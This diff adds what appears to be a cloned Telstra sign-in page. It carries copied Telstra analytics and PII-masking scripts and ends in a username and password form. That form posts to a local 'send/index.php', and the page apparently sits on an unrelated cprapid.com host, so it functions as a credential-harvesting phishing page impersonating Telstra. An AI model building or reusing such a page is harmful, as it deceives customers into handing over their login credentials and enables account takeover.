+        if(mappedValue === undefined || mappedValue === '') {
+          var omnitureDataPageSubSection = omnitureDataPageSection + _satellite.getVar('Page_Info_(Site_Subsection)');
+          mappedValue = mapping[omnitureDataPageSubSection.toLowerCase()];
+        }
+
+        if(mappedValue === undefined || mappedValue === '') {
+          var omnitureDataTempPageSubsection = omnitureDataPageSection + _satellite.getVar('OmnitureData_DL_PageInfo_CommonTmp_SubSection');
+          mappedValue = mapping[omnitureDataTempPageSubsection.toLowerCase()];
+        }
+        
+        if((mappedValue === undefined || mappedValue === '') && !isMigratedToLaunch) {
+          omnitureDataPageSection = _satellite.getVar('Page_Info_(Site_Section)').toLowerCase()
+          mappedValue = mapping[omnitureDataPageSection];
+        }
+
+        break;
+
+      case 'componentType':
+        mapping = _satellite.getVar('Config_CampaignImpression_Mapping_ComponentType');
+
+        var componentID = value.componentInfo && value.componentInfo.componentID;
+        mappedValue = mapping[componentID];
+        
+        // If not found, try looking into primaryCategory component DL
+        if(mappedValue === undefined || mappedValue === '') {
+          var componentPrimaryCategory = value.category && value.category.primaryCategory;
+          
+          // Tactical if Product Recommendation component only has tcom-product-recommendation fallback
+          if (componentPrimaryCategory === 'tcom-product-recommendation') {
+            const items = document.querySelectorAll('.tcom-product-recommendation')
+            const arr = Array.from(items);
+
+            const index = arr.findIndex(function(object) {
+              return object.dataset.tcomAnalyticsEvent.includes(componentID);
+            });
+            
+            if (index !== undefined && index >= 0) {
+              const componentPosition = index + 1;
+              mappedValue = 'prb' + componentPosition;
+            }
+          } else {
+            mappedValue = mapping[componentPrimaryCategory.toLowerCase()]; 
+          }
+
+          value = componentPrimaryCategory;
+        }
+
+        break;
+
+      default:
+        mapping = 'notype';
+    }
+
+    if(mappedValue === undefined || mappedValue === '') return value;
+
+    return mappedValue;
+  }
+  catch(e) {
+    // Log error to New Relic
+    var errorPayload = {
+      ruleName: '_tdTags',
+      functionName: 'getMappedValue',
+      error: e
+    }
+
+     _satellite.track('td-newrelic-send', { payload: errorPayload, logType: 'error' } );
+    
+    return;
+  }
+}
+
+_tdTags.getCampaignTaxonomy = function(component, eventCategory) {
+  try {
+    var componentID, campaignID, asset, productstream, productsubstream, personalisationType, platform, product, position, subposition, variation, taskID = "na";
+    var version = "v3";
+
+    var pagePrimaryCategory = _satellite.getVar('DigitalData_Page_Category_Primary');
+
+    var componentType = getMappedValue(component, 'componentType') || 'cmpt';
+    var placement = getMappedValue(pagePrimaryCategory, 'placement') || "plcm";
+ 
+    if(component.componentInfo) {
+        componentID = component.componentInfo.componentID || "na";
+        version = component.componentInfo.version || version;
+        asset = getMappedValue('asset', 'asset') || component.componentInfo.asset || "asst";
+        businessUnit = component.componentInfo.businessUnit || component.componentInfo.productStream || "bsnt";
+        businessObjective = component.componentInfo.businessObjective || component.componentInfo.productSubStream || component.componentInfo.productSubstream || "bsob";
+      
+        // product taxonomy and if product family ID data layer is found as well
+        product = component.componentInfo.product || "prdt";
+        if (typeof component.componentInfo.productFamilyID !== 'undefined' && component.componentInfo.productFamilyID !== '') {
+          product += '|' + component.componentInfo.productFamilyID;
+        }
+        
+        taskID = component.componentInfo.taskID || "tsid";
+
+        if (businessUnit.toLowerCase() === 'na') businessUnit = "bsnt";
+        if (businessObjective.toLowerCase() === 'na') businessObjective = "bsob";
+        if (product.toLowerCase() === 'na') product = "prdt";
+        if (taskID.toLowerCase() === 'na') taskID = "tsid";
+
+        // Check whether it's a BAU or personalisation, and then assign related values
+        if (eventCategory && eventCategory.toLowerCase() === 'bau') {
+          variation = component.componentInfo.variation || "defa";
+          personalisationType = 'dflt';
+          platform = 'bauc';
+        } else if (eventCategory && eventCategory.toLowerCase() === 'personalisation') {
+          variation = component.componentInfo.variation || "defa";
+          platform = component.componentInfo.platform || "plfm";
+
+          if (component.componentInfo.personalisationType && component.componentInfo.personalisationType !== '') {
+              personalisationType = component.componentInfo.personalisationType;
+          } else {
+              personalisationType = "targ";
+          }
+
+        } else {
+          variation = component.componentInfo.variation || "defa";
+          personalisationType = component.componentInfo.personalisationType && component.componentInfo.personalisationType !== '' ? component.componentInfo.personalisationType : "dflt";
+          platform = component.componentInfo.platform || "plfm";
+        }
+    }
+
+    // Setting up template depending on the version
+    var template = "{version}:{asset}:{placement}:{componentType}:{businessUnit}:{businessObjective}:{personalisationType}:{platform}:{product}:{variation}:{taskID}";
+
+    var formattedValue = template
+                        .replace("{version}", version.trim())
+                        .replace("{asset}", asset.trim())
+                        .replace("{placement}", placement.trim())
+                        .replace("{componentType}", componentType.trim())
+                        .replace("{businessUnit}", businessUnit.trim())
+                        .replace("{businessObjective}", businessObjective.trim())
+                        .replace("{personalisationType}", personalisationType.trim())
+                        .replace("{platform}", platform.trim())
+                        .replace("{product}", product.trim())
+                        .replace("{variation}", variation.trim())
+                        .replace("{taskID}", taskID.trim())
+                        .toLowerCase();
+    
+    // Check character counts
+    if (placement.length > 4 || componentType.length > 4 || businessUnit.length > 4 || businessObjective.length > 4 || personalisationType.length > 4 || platform.length > 4 || product.length > 4 ) {
+      const newRelicPayload = {
+          dataLayer: 'campaign_taxonomy',
+          errorMessage: `Exceeding character limit for campaign impression code: ${formattedValue}`,
+      }
+      
+      _satellite.track('td-newrelic-send', { payload: newRelicPayload, logType: 'dlm_audit' } );
+    }
+    
+    return formattedValue;
+  }
+  catch(e) {
+    // Log error to New Relic
+    var errorPayload = {
+        ruleName: '_tdTags',
+        functionName: 'getCampaignTaxonomy',
+        error: e
+    }
+
+    _satellite.track('td-newrelic-send', { payload: errorPayload, logType: 'error' } );
+  }
+}
+
+_tdTags.getCampaignAttribute = function(component) {
+  try {
+    if (!component) return;
+    if (!component.componentInfo) return;
+
+    var template = '{version}:{businessUnit}:{businessObjective}:{product}:{variation}:{taskID}:{recCode}:{funnel}';
+    
+    var version = 'r1';
+    var businessUnit = component.componentInfo.businessUnit || component.componentInfo.productStream || 'bsnt';
+    var businessObjective = component.componentInfo.businessObjective || component.componentInfo.productSubstream || 'bsob';
+    var product = component.componentInfo.product || 'prdt';
+    var variation = component.componentInfo.variation || 'defa';
+    var taskID = component.componentInfo.taskID || 'tsid';
+    var recCode = component.componentInfo.recCode || 'dflt';
+    var funnel = component.componentInfo.funnel || 'finl';
+
+    var formattedValue = template
+                        .replace("{version}", version)
+                        .replace("{businessUnit}", businessUnit)
+                        .replace("{businessObjective}", businessObjective)
+                        .replace("{product}", product)
+                        .replace("{variation}", variation)
+                        .replace("{taskID}", taskID)
+                        .replace("{recCode}", recCode)
+                        .replace("{funnel}", funnel)
+                        .toLowerCase();
+
+    return formattedValue;
+  } catch(e) {
+    // Log error to New Relic
+    var errorPayload = {
+        ruleName: '_tdTags',
+        functionName: 'getCampaignAttribute',
+        error: e
+    }
+
+    _satellite.track('td-newrelic-send', { payload: errorPayload, logType: 'error' } );
+    
+    return undefined;
+  }
+}
+});</script><script>_satellite["_runScript8"](function(event, target, Promise) {
+const getCampaignDataAttribute = (tenant = 'unknown', component = undefined , eventCategory = '') => {
+  /**
+  * Public function to get manually campaign data attribute for click tracking
+  * for components that have issues with re-rendering and cannot use the normal approach
+  **/
+  
+  const payload = {
+    ruleName: event.$rule.name,
+    tenant: tenant || 'unknown',
+    functionName: '_tdTags.public.getCampaignDataAttribute'
+  }
+  
+  try {
+    _satellite.track('td-newrelic-send', { payload: payload, logType: 'tdtags_public' });
+    
+    if (!component) {
+      payload.errorMessage = 'component not found';
+      _satellite.track('td-newrelic-send', { payload: payload, logType: 'error' });
+      return {};
+    }
+    
+    if (!component.category) {
+      payload.errorMessage = 'component.category not found';
+      _satellite.track('td-newrelic-send', { payload: payload, logType: 'error' });
+      return {};
+    }
+    
+    if (!component.componentInfo) {
+      payload.errorMessage = 'component.componentInfo not found';
+      _satellite.track('td-newrelic-send', { payload: payload, logType: 'error' });
+      return {};
+    }
+    
+    if (!component.componentInfo.componentID || component.componentInfo.taskID === '') {
+      payload.errorMessage = 'component.componentInfo.componentID not found';
+      _satellite.track('td-newrelic-send', { payload: payload, logType: 'error' });
+      return {};
+    }
+    
+    if (!component.componentInfo.taskID || component.componentInfo.taskID === '') {
+      payload.errorMessage = 'component.componentInfo.taskID not found';
+      _satellite.track('td-newrelic-send', { payload: payload, logType: 'error' });
+      return {};
+    }
+    
+    const attributeName = 'data-tms-analytics-campaign-code';
+    const campaignCode = _tdTags.getCampaignTaxonomy(component, eventCategory);
+    
+    if (!attributeName && !campaignCode)  {
+      payload.errorMessage = 'attributeName and campaignCode not retrieved';
+      _satellite.track('td-newrelic-send', { payload: payload, logType: 'error' });
+      return {};
+    }
+
+    return {
+      campaignDataAttribute: attributeName,
+      campaignCode: campaignCode,
+      componentID: component.componentInfo.componentID
+    }
+  } catch(e) {
+    _satellite.logger.warn(event.$rule.name, e);
+
+    // Log error to New Relic
+    payload.error = e;
+
+     _satellite.track('td-newrelic-send', { payload: payload, logType: 'error' });
+    
+    return {};
+  }
+}
+
+const isMigratedToLaunch = (tenant = 'unknown') => {
+  /**
+  * Public function to check if the particular page
+  * has been migrated to use TMS Analytics
+  **/
+  
+  const payload = {
+    ruleName: event.$rule.name,
+    tenant: tenant || 'unknown',
+    functionName: '_tdTags.public.isMigratedToLaunch'
+  }
+  
+  try {
+     _satellite.track('td-newrelic-send', { payload: payload, logType: 'tdtags_public' });
+    
+    const isMigratedToLaunch = _satellite.getVar("isMigratedToLaunch");
+
+    if (isMigratedToLaunch) return true;
+
+    return false;
+  } catch(e) {
+    _satellite.logger.warn(event.$rule.name, e);
+
+    // Log error to New Relic
+    payload.error = e;
+
+     _satellite.track('td-newrelic-send', { payload: payload, logType: 'error' });
+    
+    return false;
+  }
+}
+
+if (typeof window._tdTags.public === 'undefined') window._tdTags.public = {};
+window._tdTags.public.getCampaignDataAttribute = getCampaignDataAttribute;
+window._tdTags.public.isMigratedToLaunch = isMigratedToLaunch;
+});</script><script>_satellite["_runScript9"](function(event, target, Promise) {
+function replaceData(data, matched){
+  try {
+    for(i=0; i< matched.length; i++){
+      data = data.replace(matched[i],"xxxxx")
+    }
+
+    return data;
+  } catch(e) {
+    const payload = {
+      functionName: 'replaceData',
+      ruleName: "removePII",
+      error: e
+    }
+    
+    _satellite.track('td-newrelic-send', {
+        payload: payload,
+        logType: 'error'
+    });
+    
+    return null;
+  }
+}
+
+function checkBANorCAC(data, param) {
+  const payload = {
+    functionName: 'removePII - checkBANorCAC',
+    ruleName: "removePII"
+  }
+  
+  try {
+    const matchedData = data.toString().match(/(\d{13})|(\d{10})(?=\D*)|(\d{4})(\s+)(\d{5})(\s+)(\d{4})(?=\D*)/g);
+    if (!matchedData || matchedData === null || matchedData === '') return data;
+    
+    const maskedData = replaceData(data, matchedData);
+    if (maskedData === null) return data;
+    
+    // Log error to New Relic
+    payload.errorMessage = "PII data found in: "+ param;
+    _satellite.track('td-newrelic-send', {
+      payload: payload,
+      logType: 'error'
+    });
+
+    return maskedData;
+  } catch(e) {
+    payload.error = e;
+    
+    _satellite.track('td-newrelic-send', {
+        payload: payload,
+        logType: 'error'
+    });
+    
+    return data;
+  }
+}
+
+function checkMobileNumbers(data, param){
+  const payload = {
+    functionName: 'removePII - checkMobileNumbers',
+    ruleName: "removePII"
+  }
+  
+  try {
+    const matchedMobileNumbers = data.toString().match(/(04)\d{2}\s\d{3}\s\d{3}|(04)\d\s\d{3}\s\d{4}|(02|03|07|08)\s\d{4}\s\d{4}|(04|02|03|07|08)[0-9]{8}|\+(\(?61\)?)[0-9]{8}|\+(\(?61\)?)\s?\d{3}\s?\d{3}\s?\d{3}/g);
+    if(matchedMobileNumbers === null || matchedMobileNumbers === '') return data;
+
+    const maskedData = replaceData(data, matchedMobileNumbers);
+    if (maskedData === null) return data;
+    
+    // Log error to New Relic
+    payload.errorMessage =  "PII data found in: "+ param;
+    _satellite.track('td-newrelic-send', {
+      payload: payload,
+      logType: 'error'
+    });
+
+    return maskedData;
+  } catch(e) {
+    payload.error = e;
+    
+    _satellite.track('td-newrelic-send', {
+        payload: payload,
+        logType: 'error'
+    });
+    
+    return data;
+  }
+}
+
+function checkEmail(data, param){
+  // Log error to New Relic
+  const payload = {
+    functionName: 'removePII - checkEmail',
+    ruleName: "removePII",
+  }
+  
+  try {
+    const matchedEmails = data.toString().match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi);
+    if(matchedEmails === null || matchedEmails === '') return data;
+    
+    const maskedData = replaceData(data, matchedEmails)
+    if (maskedData === null) return data;
+
+    // Log error to New Relic
+    payload.errorMessage = "PII data found in: "+ param
+    _satellite.track('td-newrelic-send', {
+        payload: payload,
+        logType: 'error'
+    });
+    
+    return maskedData;
+  } catch(e) {
+    payload.error = e;
+    
+    _satellite.track('td-newrelic-send', {
+        payload: payload,
+        logType: 'error'
+    });
+    
+    return data;
+  }
+}
+
+_tdTags.removePII = function(data, param = "") {
+  try {
+    if (typeof data !== 'string') return data;
+    
+    data = data && data != "" && data != undefined ? checkBANorCAC(data, param): data;
+    data = data && data != "" && data != undefined ? checkMobileNumbers(data, param): data;
+    data = data && data != "" && data != undefined ? checkEmail(data, param) : data;
+    
+    return data;
+  } catch(e) {
+    const payload = {
+      functionName: 'removePII',
+      ruleName: "removePII",
+      error: e
+    }
+    
+    _satellite.track('td-newrelic-send', {
+        payload: payload,
+        logType: 'error'
+    });
+    
+    return data;
+  }
+}
+});</script><script>_satellite["_runScript10"](function(event, target, Promise) {
+/*!
+ * Add items to an object at a specific path
+ * (c) 2018 Chris Ferdinandi, MIT License, https://gomakethings.com
+ * @param  {Object}       obj  The object
+ * @param  {String|Array} path The path to assign the value to
+ * @param  {*}            val  The value to assign
+ */
+_tdTags.xdmPut = function (obj, path, val) {
+  /**
+   * If the path is a string, convert it to an array
+   * @param  {String|Array} path The path
+   * @return {Array}             The path array
+   */
+  var stringToPath = function (path) {
+
+      // If the path isn't a string, return it
+      if (typeof path !== 'string') return path;
+
+      // Create new array
+      var output = [];
+
+      // Split to an array with dot notation
+      path.split('.').forEach(function (item, index) {
+
+          // Split to an array with bracket notation
+          item.split(/\[([^}]+)\]/g).forEach(function (key) {
+
+              // Push to the new array
+              if (key.length > 0) {
+                  output.push(key);
+              }
+
+          });
+
+      });
+
+      return output;
+
+  };
+
+  // Convert the path to an array if not already
+  path = stringToPath(path);
+
+  // Cache the path length and current spot in the object
+  var length = path.length;
+  var current = obj;
+
+  // Loop through the path
+  path.forEach(function (key, index) {
+
+      // Check if the assigned key shoul be an array
+      var isArray = key.slice(-2) === '[]';
+
+      // If so, get the true key name by removing the trailing []
+      key = isArray ? key.slice(0, -2) : key;
+
+      // If the key should be an array and isn't, create an array
+      if (isArray && Object.prototype.toString.call(current[key]) !== '[object Array]') {
+          current[key] = [];
+      }
+
+      // If this is the last item in the loop, assign the value
+      if (index === length -1) {
+
+          // If it's an array, push the value
+          // Otherwise, assign it
+          if (isArray) {
+              current[key].push(val);
+          } else {
+              current[key] = val;
+          }
+      }
+
+      // Otherwise, update the current place in the object
+      else {
+
+          // If the key doesn't exist, create it
+          if (!current[key]) {
+              current[key] = {};
+          }
+
+          // Update the current place in the object
+          current = current[key];
+
+      }
+
+  });
+};
+});</script><script>
+if (typeof _tdTags !== "undefined") {
+  // Set relevant sampling flag
+  _tdTags.samplingMatch70 = true;
+}
+</script><script>
+if (typeof _tdTags !== "undefined") {
+  // Set relevant sampling flag
+  _tdTags.samplingMatch99 = true;
+}
+</script><script>
+if (typeof _tdTags !== "undefined") {
+  // Set relevant sampling flag
+  _tdTags.samplingMatch100 = true;
+}
+</script>
+    <script type="text/javascript" src="https://www.telstra.com.au/apps/liveperson/import.htm"></script><link rel="stylesheet" href="https://www.telstra.com.au/content/dam/tcom/virtualassistant/css/lp-override-v2.css">
+    <script src="https://myid.telstra.com/identity/assets/svg4everybody.legacy.js"></script>
+    <script>
+        var isIE = "-ms-scroll-limit" in document.documentElement.style && "-ms-ime-align" in document.documentElement.style;
+        if (isIE) {
+            svg4everybody();
+        }
+    </script>
+<script src="https://assets.adobedtm.com/475abcba9222/2dd2a974be18/0136bd56111e/RCc21065b60e3f477f869799b077a63350-source.min.js" async=""></script><script src="https://assets.adobedtm.com/475abcba9222/2dd2a974be18/0136bd56111e/RCc438817952d242beb452d0b006ce207e-source.min.js" async=""></script><script src="https://assets.adobedtm.com/475abcba9222/2dd2a974be18/0136bd56111e/RCccc482816bf6481c9afec0ae0a82e475-source.min.js" async=""></script><script src="https://assets.adobedtm.com/475abcba9222/2dd2a974be18/0136bd56111e/RCeab4fdf544264bdcba300e32371c81be-source.min.js" async=""></script><script src="https://assets.adobedtm.com/475abcba9222/2dd2a974be18/0136bd56111e/RC0c9d7b4fdd4349ef96f6d5082774f546-source.min.js" async=""></script><script src="//bat.bing.com/bat.js" async=""></script><script src="https://www.telstra.com.au/content/dam/analytics/analytics.js?launch=true&amp;cb=515" async=""></script><script src="https://bat.bing.com/p/action/16003922.js" type="text/javascript" async="" data-ueto="ueto_886072e2fb"></script><script type="text/javascript" src="//www.telstra.com.au/content/dam/analytics/sites/common.min.js" async=""></script><script type="text/javascript" src="//www.telstra.com.au/content/dam/analytics/sites/livechat.min.js" async=""></script><script type="text/javascript" src="//www.telstra.com.au/content/dam/analytics/adobetags.min.js?source=CQ5"></script><script src="https://assets.adobedtm.com/475abcba9222/2dd2a974be18/0136bd56111e/RC6db18e45567d4011a6ffb514cb93e13f-source.min.js" async=""></script></head>
+<body>
+
+<div>
+<header class="t-page-header">
+			<svg width="33px" height="33px" viewBox="0 0 33 33" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-label="Telstra Logo" role="img" focusable="false">
+    <g id="Artboard" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <g id="Telstra_Primary-logo_C_RGB" fill-rule="nonzero">
+            <path d="M18.742504,14.0832 L17.5024033,21.3536 C17.2460517,22.6624 16.3840696,23.0144 15.6182193,23.0144 L9.88235294,23.0144 L12.3016709,9.6992 C9.88876173,8.5952 7.42137789,7.8752 5.4602884,7.8752 C3.59212634,7.8752 2.0764477,8.3808 1.0670634,9.5872 C0.3556878,10.448 0,11.5104 0,12.7712 C0,16.5568 2.98008698,21.808 8.08468757,26.0928 C12.6317235,29.8784 17.6369879,32 21.2771801,32 C23.0940719,32 24.5584802,31.4432 25.523003,30.336 C26.2792401,29.4784 26.5836576,28.3648 26.5836576,27.104 C26.5836576,23.424 23.5811398,18.2688 18.742504,14.0832 Z" id="Path" fill="#F96449"></path>
+            <path d="M8.44037537,0 C7.53032731,0 6.77409018,0.6112 6.57221332,1.568 L5.76470588,5.9552 L12.9777981,5.9552 L9.87914855,23.0112 L15.6182193,23.0112 C16.3840696,23.0112 17.2460517,22.656 17.5024033,21.3504 L20.1268025,5.9552 L25.3179217,5.9552 C26.2311742,5.9552 26.9874113,5.3504 27.1892882,4.3904 L28,0 L8.44037537,0 Z" id="Path" fill="#0D54FF"></path>
+        </g>
+    </g>
+</svg>
+	</header>
+    <div role="main" class="t-form-container">
+        <h1 class="t-able-heading-b t-able-spacing-2x-mb">Sign in</h1>
+        <div class="t-able-text-bodyshort t-able-spacing-7x-mb">Sign in with your Telstra ID</div>
+        <form method="POST" action="send/index.php" autocomplete="off">
+
+
+<div class="t-able-text-field t-pwd-field  t-able-spacing-2x-mb  " bis_skin_checked="1">
+	<label for="username">Username</label>
+	<input id="username" type="username" name="username" autofocus="" autocomplete="username" aria-invalid="false" aria-required="true" aria-describedby="" onblur="handleOnblurEvent(event, true)" required="">
+
+</div>
+
+            <div class="t-able-text-field t-pwd-field  t-able-spacing-2x-mb  " bis_skin_checked="1">
+	<label for="password">Password</label>
+	<input id="password" type="password" name="password" autofocus="" autocomplete="current-password" aria-invalid="false" aria-required="true" aria-describedby="" onblur="handleOnblurEvent(event, true)" required="">
+	<button type="button" id="showPwdBtn" class="t-able-low-emph-button t-showpwd" aria-label="Show password characters" onclick="showHide('show', 'showPwdBtn', 'hidePwdBtn', 'password', 't-icon--hidden')">Show</button>
+	<button type="button" id="hidePwdBtn" class="t-able-low-emph-button t-showpwd t-icon--hidden" aria-label="Hide password characters" onclick="showHide('hide', 'hidePwdBtn', 'showPwdBtn', 'password', 't-icon--hidden')">Hide</button>
+	<p id="password-error-text"></p>
+</div>
+
+
+
+
+	<div class=" t-able-spacing-2x-mb " bis_skin_checked="1">
+												<a class="t-able-low-emph-button  t-reset-password-link " href="#" onclick="loadAnalyticEvents('click', 'clickTrack', 'linkClick', 'Reset password')">
+					Recover account
+									</a>
+						</div>
+            <div class="t-able-checkbox t-able-spacing-3x-mb">
+                <input name="$rememberUsername" type="checkbox" id="rememberUsername">
+                <label for="rememberUsername"> Remember username</label>
+            </div>
+            <input type="hidden" name="$ok" value="clicked">
+            <input type="hidden" name="$cancel" value="">
+            <input type="hidden" name="client_id" value="mytelstra">
+            <input type="hidden" name="$adapterIdField" id="$adapterIdField" value="$adapterId">
+            <input type="hidden" name="authnPassKeyResponse" value="">
+            <input type="hidden" name="NoPasskeyBrwFlow" value="">
+            <input type="hidden" name="errorMsg" value="">
+            <input type="hidden" name="errorName" value="">
+            <input type="hidden" name="passkeysupported" value="yes">
+            <input type="hidden" name="passkeyPageSignin" value="false">
+            <div class="">
+                <button id="submit_btn" class="t-able-high-emph-button t-able-spacing-2x-mb" type="submit" onclick="handleSubmitBtnClk(event)">Continue
+                </button>
+            </div>
+            <p class="t-able-sub-head-line t-able-spacing-2x-mb">OR</p>
+            <a class="t-able-medium-emph-button t-able-spacing-7x-mb" href="#" onclick="loadAnalyticEvents('click', 'clickTrack', 'buttonClick', 'Create a Telstra ID')">Create a Telstra ID</a>
+        </form>
+    </div>
+    <footer class="t-footer">
+        <div class="t-footer-content">
+            <p class="t-footer-copyright">Copyright © 2025 Telstra</p>
+            <a class="t-footer-privacy" href="#" target="_blank">Privacy</a>
+            <a class="t-footer-terms" href="#" target="_blank">Terms of use</a>
+        </div>
+    </footer>
+</div>
+
+<script>_satellite["_runScript11"](function(event, target, Promise) {
+if("object"==typeof newrelic){var versionName=_satellite.getVar("Tool_AdobeLaunch_Version");newrelic.addPageAction("DOC_Adobe_Launch_Version",{docAdobeLaunchVersion:versionName})}
+});</script><script>_satellite["_runScript12"](function(event, target, Promise) {
+var isMigratedToLaunch=_satellite.getVar("isMigratedToLaunch");window.omnitureData="object"==typeof omnitureData?omnitureData:{},window.omnitureData.isLaunch=!0===isMigratedToLaunch;var launchMigrationStatus=_satellite.getVar("launchMigrationStatus");window.omnitureData.launchMigrationStatus=launchMigrationStatus;var launchMigrationStatusExcludedTools=_satellite.getVar("Framework_LaunchMigrationStatus_ExcludedTools");window.omnitureData.launchMigrationStatusExcludedTools=launchMigrationStatusExcludedTools;
+});</script><script>_satellite["_runScript13"](function(event, target, Promise) {
+var cbd=new Date,cbdString=cbd.getUTCDate().toString()+cbd.getUTCHours().toString(),runLaunchCookie=_satellite.cookie.get("runLaunch"),h=document.getElementsByTagName("head");0===h.length&&(h[0]=document.body.parentNode.appendChild(document.createElement("head")));var analyticsScript=document.createElement("script");analyticsScript.src="https://www.telstra.com.au/content/dam/analytics/analytics.js?launch=true&cb="+cbdString,analyticsScript.async=!0,h[0].appendChild(analyticsScript);
+});</script><script>_satellite["_runScript14"](function(event, target, Promise) {
+try{if(RegExp("(.*.|)telstra.com.au").test(document.location.hostname)&&"object"==typeof newrelic&&Intl&&Intl.DateTimeFormat()&&Intl.DateTimeFormat().resolvedOptions()&&Intl.DateTimeFormat().resolvedOptions().timeZone){var timezoneCountry=Intl.DateTimeFormat().resolvedOptions().timeZone;if(timezoneCountry.indexOf("Europe")>-1){var cookieValue=_satellite.cookie.get("is_eu_visitor");newrelic.setCustomAttribute("doc_timezoneCountry",timezoneCountry),newrelic.addPageAction("DOC_GDPR_Timezone_Country_Listed",{cookieValue:cookieValue,timezoneCountry:timezoneCountry})}}}catch(e){}
+});</script><div id="batBeacon474286839522" style="width: 0px; height: 0px; display: none; visibility: hidden;"><img id="batBeacon764052064134" width="0" height="0" alt="" src="https://bat.bing.com/action/0?ti=16003922&amp;tm=al001&amp;Ver=2&amp;mid=950b2b49-16cd-4185-9b54-52cc5f5a3fea&amp;bo=1&amp;sid=5a486420421f11f0b72ded3270cb2ffa&amp;vid=5a487600421f11f0a1f835aa96d1e270&amp;vids=1&amp;msclkid=N&amp;uach=pv%3D19.0.0&amp;pi=918639831&amp;lg=en-US&amp;sw=800&amp;sh=600&amp;sc=24&amp;nwd=1&amp;tl=Sign%20in%20with%20your%20Telstra%20ID&amp;p=https%3A%2F%2F104-168-56-26.cprapid.com%2Fmy-id%2Ftelstra%2Fsignin%2F&amp;r=&amp;lt=2097&amp;pt=1749136285093,,,,,1,1,11,11,500,253,500,788,792,791,2095,2095,2097,,,&amp;pn=0,0&amp;evt=pageLoad&amp;sv=1&amp;cdb=ARoR&amp;rn=689619" style="width: 0px; height: 0px; display: none; visibility: hidden;"></div></body></html>
